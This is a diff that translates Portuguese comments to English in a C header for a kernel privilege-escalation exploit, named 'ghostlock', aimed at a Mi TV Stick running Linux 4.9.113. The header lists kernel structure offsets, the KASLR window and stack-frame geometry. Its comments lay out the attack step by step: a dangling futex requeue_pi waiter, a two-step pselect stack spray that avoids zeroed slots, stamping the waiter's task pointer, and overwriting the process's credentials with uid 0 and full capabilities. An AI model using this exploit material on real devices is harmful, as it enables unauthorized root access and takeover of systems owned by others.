@@ -1,21 +1,21 @@
 /*
  * ghostlock_target.h — aquaman (Mi TV Stick 1080p, 4.9.113 SMP PREEMPT armv8l)
  *
- * FONTE DE TODOS OS OFFSETS: DWARF do build de lab
+ * SOURCE OF EVERY OFFSET: DWARF from the lab build
  *   build-aq/vmlinux  (McMCCRU/linux-amlogic 3d4ab79e, meson64_defconfig + 2
- *   ajustes locais, gcc Linaro 6.3.1 20170109, o MESMO gcc do binario stock)
+ *   local tweaks, gcc Linaro 6.3.1 20170109, the SAME gcc as the stock binary)
  *
- * build-aq NAO e o source nem o binario do PI.2055. Todo numero aqui e
- * INFERIDO ate ser validado por leitura em runtime (pos-R/W) ou por
- * calibracao no aparelho. Os numeros sao de um build ARM64 4.9.113 com o
- * mesmo toolchain, entao a geometria e a melhor hipotese disponivel — mas
- * HIPOTESE, nao fato.
+ * build-aq is NEITHER the PI.2055 source NOR the PI.2055 binary. Every number
+ * here is INFERRED until validated by a runtime read (post-R/W) or by
+ * calibration on the device. The numbers come from an ARM64 4.9.113 build with
+ * the same toolchain, so the geometry is the best available guess — but a
+ * GUESS, not fact.
  *
- * PROIBIDO copiar numeros de outros devices:
- *   - hazel ARM32 4.9 (mutex +0x18, mm 0x1c0)          -> NAO usado
- *   - aresin 4.14 MTK ARM64 (cred 0x788/0x790)          -> NAO usado
+ * Copying numbers from other devices is FORBIDDEN:
+ *   - hazel ARM32 4.9 (mutex +0x18, mm 0x1c0)          -> NOT used
+ *   - aresin 4.14 MTK ARM64 (cred 0x788/0x790)          -> NOT used
  *
- * Gerar/refresh:
+ * Generate/refresh:
  *   python3 tools/dwarf_offsets.py build-aq/vmlinux
  *   llvm-dwarfdump --debug-info=<die> --show-children build-aq/vmlinux
  */
@@ -32,14 +32,14 @@
 #define GL_HZ                    300
 #define GL_PREEMPT               1
 
-/* lab vmlinux: text em VA39 sem KASLR no objdir; KIMAGE_Z/base sao
- * INFERIDOS para o stock (ver ghostlock-kaslr-symbols.md). */
-#define GL_LAB_TEXT_BASE         0xffffff8008000000ULL   /* INFERIDO p/ stock */
-#define GL_TEXT_OFF_MAX          0x01000000ULL           /* 16 MB de janela KASLR */
+/* lab vmlinux: text in VA39, no KASLR in the objdir; KIMAGE_Z/base are
+ * INFERRED for stock (see ghostlock-kaslr-symbols.md). */
+#define GL_LAB_TEXT_BASE         0xffffff8008000000ULL   /* INFERRED for stock */
+#define GL_TEXT_OFF_MAX          0x01000000ULL           /* 16 MB KASLR window */
 
 /* ------------------------------------------------------------------ */
-/* 1. rt_mutex_waiter — CONFIRMADO pelo DWARF do lab                    */
-/*    (rtmutex_common.h, sem CONFIG_DEBUG_RT_MUTEXES)                   */
+/* 1. rt_mutex_waiter — CONFIRMED by the lab DWARF                     */
+/*    (rtmutex_common.h, no CONFIG_DEBUG_RT_MUTEXES)                    */
 /* ------------------------------------------------------------------ */
 #define GL_RTMW_SIZE             0x50
 #define GL_RTMW_TREE_ENTRY       0x00   /* rb_node 0x18 */
@@ -49,14 +49,14 @@
 #define GL_RTMW_PRIO             0x40   /* int  (4B + 4 pad) */
 #define GL_RTMW_DEADLINE         0x48   /* u64 */
 
-/* offsets que o walk do kernel realmente toca (rt_mutex_get_effective_prio,
- * rtmutex.c:1405-1425 no lab build):
- *   p->pi_waiters (task+0x7e0)  -> se NULL, caminho rapido, NAO toca o frame
+/* offsets the kernel walk actually touches (rt_mutex_get_effective_prio,
+ * rtmutex.c:1405-1425 in the lab build):
+ *   p->pi_waiters (task+0x7e0)  -> if NULL, fast path, does NOT touch the frame
  *   p->pi_waiters_leftmost (0x7e8) = &waiter->pi_tree_entry
- *   *(&waiter->pi_tree_entry + 0x18) == waiter->task   (LEITURA de ponteiro)
- *   waiter->task->prio (task+0x68)                        (LEITURA de int)
- * Consequencia de calibracao: carimbar waiter->task com PAGE_OFFSET da
- * leitura e sempre segura (VA do physmap esta mapeada em qualquer build). */
+ *   *(&waiter->pi_tree_entry + 0x18) == waiter->task   (POINTER read)
+ *   waiter->task->prio (task+0x68)                        (int read)
+ * Calibration consequence: stamping waiter->task with PAGE_OFFSET of the
+ * read is always safe (the physmap VA is mapped in any build). */
 #define GL_RTMW_TASK_OFF_FROM_PI_ENTRY  0x18
 
 /* ------------------------------------------------------------------ */
@@ -107,8 +107,8 @@
 #define GL_CRED_CAP_BSET         0x40
 #define GL_CRED_CAP_AMBIENT      0x48
 /* 0x04..0x24 = uid,gid,suid,sgid,euid,egid,fsuid,fsgid,securebits = 0x20 bytes.
- * Zera isso = uid/gid 0 e securebits 0 (SEM_CAPS 0 -> deixa caps). Por isso
- * ainda grava CAP_FULL em cap_permitted/cap_effective/cap_bset/cap_ambient. */
+ * Zeroing that = uid/gid 0 and securebits 0 (no_caps 0 -> keeps caps). Hence
+ * it still writes CAP_FULL into cap_permitted/cap_effective/cap_bset/cap_ambient. */
 #define GL_CRED_IDS_SPAN         0x20
 #define GL_CAP_FULL              0x000001ffffffffffULL
 
@@ -122,7 +122,7 @@
 #define GL_RTMUTEX_OWNER         0x18   /* struct task_struct * */
 
 /* ------------------------------------------------------------------ */
-/* 5. futex_q — size 0x70 (so p/ leitura de q->rt_waiter)             */
+/* 5. futex_q — size 0x70 (only for reading q->rt_waiter)               */
 /* ------------------------------------------------------------------ */
 #define GL_FUTEXQ_SIZE           0x70
 #define GL_FUTEXQ_LIST           0x00
@@ -135,21 +135,22 @@
 #define GL_FUTEXQ_BITSET         0x68
 
 /* ------------------------------------------------------------------ */
-/* 6. geometria de frame (LAB, INFERIDO p/ o stock)                    */
-/*    Medido por llvm-objdump no vmlinux de lab.                       */
+/* 6. frame geometry (LAB, INFERRED for stock)                        */
+/*    Measured with llvm-objdump on the lab vmlinux.                   */
 /* ------------------------------------------------------------------ */
-/* Cadeia do waiter (frames subtraidos do SP de entrada da syscall):
+/* Waiter chain (frames subtracted from the syscall entry SP):
  *   entry  -> SyS_futex            -0x70  (llvm-objdump SyS_futex @ 0xffffff800913ca30)
  *   SyS_futex -> do_futex          -0x120 (do_futex @ 0xffffff800913bec0)
  *   do_futex -> futex_wait_requeue_pi.constprop.8 -0x1a0 (@ 0xffffff800913b398;
- *     System.map so tem o clone constprop.8 (t); do_futex+0x4b4 @ 0xffffff800913c374
- *     chama o clone direto, sem simbolo plain)
- *   rt_waiter em x29+0x80: DWARF DIE 0x00a9e1d8 (futex.c:2858) DW_OP_fbreg -288,
- *     CFA = x29+0x1a0; asm confirma x2 vias: x21=x29+0x80 @ 0xffffff800913b454
- *     passado como waiter a rt_mutex_finish_proxy_lock @ 0xffffff800913b6d4 e
- *     guardado em q.rt_waiter ([x29,#0x188] = q+0x58) @ 0xffffff800913b4a8
- *   => rt_waiter = SP_ENTRADA_SYSCALL - 0x330 + 0x80 = SP - 0x2b0
- * Re-medido no host em 2026-09-29 (out/logs/frame_reconcile.log): nenhum numero mudou.
+ *     System.map only has the constprop.8 clone (t); do_futex+0x4b4 @ 0xffffff800913c374
+ *     calls the clone directly, no plain symbol)
+ *   rt_waiter at x29+0x80: DWARF DIE 0x00a9e1d8 (futex.c:2858) DW_OP_fbreg -288,
+ *     CFA = x29+0x1a0; asm confirms two paths: x21=x29+0x80 @ 0xffffff800913b454
+ *     passed as waiter to rt_mutex_finish_proxy_lock @ 0xffffff800913b6d4 and
+ *     stored in q.rt_waiter ([x29,#0x188] = q+0x58) @ 0xffffff800913b4a8
+ *   => rt_waiter = SP_SYSCALL_ENTRY - 0x330 + 0x80 = SP - 0x2b0
+ * Re-measured on the host on 2026-09-29 (out/logs/frame_reconcile.log): no
+ * number changed.
  */
 #define GL_SPO_ENTER_FUTEX       0x0000UL
 #define GL_FRAME_SYF_FUTEX       0x0070
@@ -159,64 +160,64 @@
 /* deslocamento do waiter abaixo do SP de entrada da syscall do waiter */
 #define GL_WAITER_OFF_SP         0x02b0UL
 
-/* Cadeia do carimbo (pselect): core_sys_select mantém o array stack_fds no
- * proprio frame, em x29+0x90 (DWARF fs/select.c:561, long[32], DW_OP_fbreg -256,
+/* Stamp chain (pselect): core_sys_select keeps the stack_fds array in its own
+ * frame, at x29+0x90 (DWARF fs/select.c:561, long[32], DW_OP_fbreg -256,
  * CFA = x29+0x190; asm: add x25,x29,#0x90 @ core_sys_select+0x74 = 0xffffff80092302d4;
  * SyS_pselect6 frame 0x90 @ 0xffffff8009230770, core_sys_select frame 0x190
- * @ 0xffffff8009230260, limite stack/kmalloc cmp size,#0x2a @ 0xffffff80092302cc).
- *   stack_fds[0] = SP_ENTRADA - 0x90 - 0x190 + 0x90 = SP_ENTRADA - 0x190
+ * @ 0xffffff8009230260, stack/kmalloc boundary cmp size,#0x2a @ 0xffffff80092302cc).
+ *   stack_fds[0] = SP_ENTRY - 0x90 - 0x190 + 0x90 = SP_ENTRY - 0x190
  *
- * CRUCIAL (medido no asm do lab, core_sys_select+0x6c):
+ * CRUCIAL (measured in the lab asm, core_sys_select+0x6c):
  *     cmp size, #0x2a
- *     b.hi  <caminho kmalloc>
- * ou seja, se `size` (= ((nfds+63)/64)*8) passar de 42 bytes o array vai
- * para kmalloc/vmalloc e NAO toca a stack. pselect(1024,...) nao carimba
- * nada no stack neste kernel. O limite do stack e:
+ *     b.hi  <kmalloc path>
+ * i.e. if `size` (= ((nfds+63)/64)*8) goes past 42 bytes the array goes to
+ * kmalloc/vmalloc and does NOT touch the stack. pselect(1024,...) stamps
+ * nothing on the stack in this kernel. The stack limit is:
  *     nwords <= 5  =>  nfds <= 320  =>  size = 40 = 0x28
- * 6 slots de 40B = 240B = 0xF0, cabendo em 0x90..0x180 (frame = 0x190).
+ * 6 slots of 40B = 240B = 0xF0, fitting in 0x90..0x180 (frame = 0x190).
  *
- * Slots (medido no asm):
- *   [0] rinp   <- copy_from_user( in     )  conteudo do usuario
- *   [1] routp  <- copy_from_user( out    )  conteudo do usuario
- *   [2] rexp   <- copy_from_user( except )  conteudo do usuario
+ * Slots (measured in the asm):
+ *   [0] rinp   <- copy_from_user( in     )  user content
+ *   [1] routp  <- copy_from_user( out    )  user content
+ *   [2] rexp   <- copy_from_user( except )  user content
  *   [3] res_in  <- memset(0)
  *   [4] res_out <- memset(0)
  *   [5] res_ex  <- memset(0)
  *
- * Os 3 slots memset(0) sao o problema: waiter->task = 0 => o consumer
- * desreferencia 0x68 => oops. Solucao: segundo pselect 0x78 bytes MAIS
- * RASO, que cobre exatamente [A+0x78, A+0xF0) e restaura o pattern nos
- * slots que o primeiro zerou. Ordem obrigatoria: pselect PROFUNDO primeiro,
- * pselect RASO depois. Resultado: 0xF0 bytes 100% pattern, nenhum zero.
+ * The 3 memset(0) slots are the problem: waiter->task = 0 => the consumer
+ * dereferences 0x68 => oops. Fix: a second pselect 0x78 bytes SHALLOWER,
+ * covering exactly [A+0x78, A+0xF0), restoring the pattern in the slots the
+ * first one zeroed. Mandatory order: DEEP pselect first, SHALLOW after.
+ * Result: 0xF0 bytes 100% pattern, not a single zero.
  */
 #define GL_FRAME_SPSEL            0x0090
 #define GL_FRAME_CSS              0x0190
-#define GL_STACK_FDS_OFF_SP       0x0190UL   /* abaixo do SP de entrada */
+#define GL_STACK_FDS_OFF_SP       0x0190UL   /* below the entry SP */
 #define GL_STACK_FDS_SLOTS        6
 #define GL_PSEL_MAX_NFDS          320        /* 320 bits -> size 40 */
 #define GL_PSEL_SIZE              0x28       /* bytes por fd_set */
 #define GL_PSEL_SPAN              (GL_STACK_FDS_SLOTS * GL_PSEL_SIZE) /* 0xf0 */
 #define GL_PSEL_SLOT3_OFF         (3 * GL_PSEL_SIZE)                /* 0x78 */
 
-/* PAD do usuario: quantos bytes o carimbo precisa descer na stack do usuario
- * para que stack_fds[0] == &rt_waiter.
+/* User PAD: how many bytes the stamp must descend on the user stack for
+ * stack_fds[0] to land on &rt_waiter.
  *   SP_psel = SP_futex - PAD
  *   SP_psel - 0x190 == SP_futex - 0x2b0  =>  PAD = 0x2b0 - 0x190 = 0x120
- * Hipotese para o lab. O aparelho pode divergir: e o que a calibracao mede.
- * O alvo util e qualquer PAD em [0x120, 0x120+0xf0-0x50] = [0x120, 0x1c0]
- * (enquanto os 0x50 bytes do waiter caberem dentro da janela de 0xf0).
- * CAVEAT (lido no codigo, sem boot): stamp() aloca VLA de tamanho fixo
- * (MAX_PAD) e so varia o memset len, entao o SP de usuario e identico p/
- * todo PAD e o stack_fds do kernel nao se move (frames fixos, ver acima).
- * A varredura [0x120,0x1c0] foi portanto um no-op; veredito do 0x138 e a
- * proposta do oraculo por valor em reports/ghostlock-value-oracle.md. */
+ * Hypothesis for the lab. The device may diverge: that is what calibration
+ * measures. The useful target is any PAD in [0x120, 0x120+0xf0-0x50] =
+ * [0x120, 0x1c0] (as long as the waiter's 0x50 bytes fit in the 0xf0 window).
+ * CAVEAT (read from the code, no boot): stamp() allocates a fixed-size VLA
+ * (MAX_PAD) and only varies the memset len, so the user SP is identical for
+ * every PAD and the kernel stack_fds does not move (fixed frames, see above).
+ * The [0x120,0x1c0] sweep was therefore a no-op; the 0x138 verdict and the
+ * value-oracle proposal are in reports/ghostlock-value-oracle.md. */
 #define GL_PSELECT_SHIFT_LAB      0x0120UL
 #define GL_PSELECT_SHIFT_MIN      0x0120UL
 #define GL_PSELECT_SHIFT_MAX      0x01c0UL
 
 /* ------------------------------------------------------------------ */
 /* 7. mm_struct — size 0x338 (SLUB, cache dedicado "mm_struct")        */
-/*    0x338 = 824B -> 4 objetos por pagina de 4K                        */
+/*    0x338 = 824B -> 4 objects per 4K page                             */
 /* ------------------------------------------------------------------ */
 #define GL_MM_SIZE               0x338
 #define GL_MM_MMAP               0x000
@@ -244,13 +245,13 @@
 #define GL_CFBUF_POS             0x08   /* loff_t */
 #define GL_CFBUF_PAGE            0x10   /* struct page * */
 #define GL_CFBUF_OPS             0x18   /* struct configfs_buffer_ops * */
-#define GL_CFBUF_MUTEX           0x20   /* struct mutex (count=1 => solto) */
+#define GL_CFBUF_MUTEX           0x20   /* struct mutex (count=1 => free) */
 #define GL_CFBUF_NEEDS_READ_FILL 0x48
 #define GL_CFBUF_READ_IN_PROG    0x4c
 #define GL_CFBUF_WRITE_IN_PROG   0x4d
 #define GL_CFBUF_BIN_BUFFER      0x50
 #define GL_CFBUF_BIN_BUFFER_SZ   0x58
-/* rt_mutex embebido em struct mutex: wait_lock u32 @0, waiters rb_root @+4,
+/* rt_mutex embedded in struct mutex: wait_lock u32 @0, waiters rb_root @+4,
  * waiters_leftmost @+0xc, owner @+0x14 */
 #define GL_MUTEX_WAIT_LOCK       0x00
 #define GL_MUTEX_WAITERS         0x04
@@ -294,11 +295,11 @@
 
 /* ------------------------------------------------------------------ */
 /* 11. ashmem_area — size 0x138                                        */
-/*     name[] ocupa 0x00..0x10f (len 0x10c, padded p/ 0x110)           */
+/*     name[] spans 0x00..0x10f (len 0x10c, padded to 0x110)           */
 /* ------------------------------------------------------------------ */
 #define GL_ASHMEM_AREA_SIZE      0x138
 #define GL_ASHMEM_NAME           0x000
-#define GL_ASHMEM_NAME_MAX       0x10c   /* 256 + 11 (prefixo) + 1 */
+#define GL_ASHMEM_NAME_MAX       0x10c   /* 256 + 11 (prefix) + 1 */
 #define GL_ASHMEM_PREFIX         "/dev/ashmem/"
 #define GL_ASHMEM_PREFIX_LEN     11
 #define GL_ASHMEM_UNPINNED_LIST  0x110
@@ -308,7 +309,7 @@
 #define GL_ASHMEM_DEV            "/dev/ashmem"
 
 /* ------------------------------------------------------------------ */
-/* 12. pipe_buffer — size 0x28 (plano B, rota physmap)                 */
+/* 12. pipe_buffer — size 0x28 (plan B, physmap route)                  */
 /* ------------------------------------------------------------------ */
 #define GL_PIPEBUF_SIZE          0x28
 #define GL_PIPEBUF_PAGE          0x00   /* struct page * */
@@ -319,7 +320,7 @@
 #define GL_PIPEBUF_PRIVATE       0x20
 
 /* ------------------------------------------------------------------ */
-/* 13. config observado no aquaman-config (facts, nao inferencias)     */
+/* 13. config seen in aquaman-config (facts, not inferences)            */
 /* ------------------------------------------------------------------ */
 #define GL_CFG_FUTEX             1
 #define GL_CFG_RT_MUTEXES        1
@@ -339,22 +340,22 @@
 #define GL_CFG_STACKPROTECTOR_STRONG 1
 
 /* ------------------------------------------------------------------ */
-/* 14. classificacao de status                                         */
+/* 14. status classification                                            */
 /* ------------------------------------------------------------------ */
-#define GL_STATUS_INFERIDO  "INFERIDO (DWARF build-aq, nao binario PI.2055)"
-#define GL_STATUS_CONFIRMADO "CONFIRMADO no hardware"
+#define GL_STATUS_INFERRED  "INFERRED (DWARF build-aq, not PI.2055 binary)"
+#define GL_STATUS_CONFIRMED "CONFIRMED on hardware"
 
-/* boot/sobrevivencia: o consumer chama pthread_setschedparam no waiter, o
- * que entra em rt_mutex_get_effective_prio e le:
- *     task->pi_waiters (0x7e0)            -> NULL?  retorno rapido, frame intocado
+/* boot/survival: the consumer calls pthread_setschedparam on the waiter,
+ * which enters rt_mutex_get_effective_prio and reads:
+ *     task->pi_waiters (0x7e0)            -> NULL?  fast return, frame untouched
  *     task->pi_waiters_leftmost (0x7e8)   -> &waiter->pi_tree_entry (frame)
- *     *(+0x18)                             -> waiter->task      (DESREF!)
+ *     *(+0x18)                             -> waiter->task      (DEREF!)
  *     waiter->task->prio (0x68)            -> int
- * Se waiter->task == 0 => desref em 0x68 => oops. Nunca carimbar 0.
- * Carimbar com GL_PAGE_OFFSET: VA do physmap, sempre mapeada, leitura segura.
- * Oraculo: waiter->task intacto == thread atual (prio ~120, > 99, caminho
- * "RT" que entra em rt_mutex chain e da o stall de ~60s do baseline);
- * waiter->task carimbado == PAGE_OFFSET (prio lido da RAM fisica, tipicamente
- * 0..255, caminho <99, consumer retorna em microssegundos). */
+ * If waiter->task == 0 => deref at 0x68 => oops. Never stamp 0.
+ * Stamp with GL_PAGE_OFFSET: physmap VA, always mapped, read is safe.
+ * Oracle: waiter->task intact == current thread (prio ~120, > 99, the "RT"
+ * path that enters the rt_mutex chain and produces the baseline ~60s stall);
+ * waiter->task stamped == PAGE_OFFSET (prio read from physical RAM, typically
+ * 0..255, path <99, consumer returns in microseconds). */
 
 #endif /* GHOSTLOCK_TARGET_H */
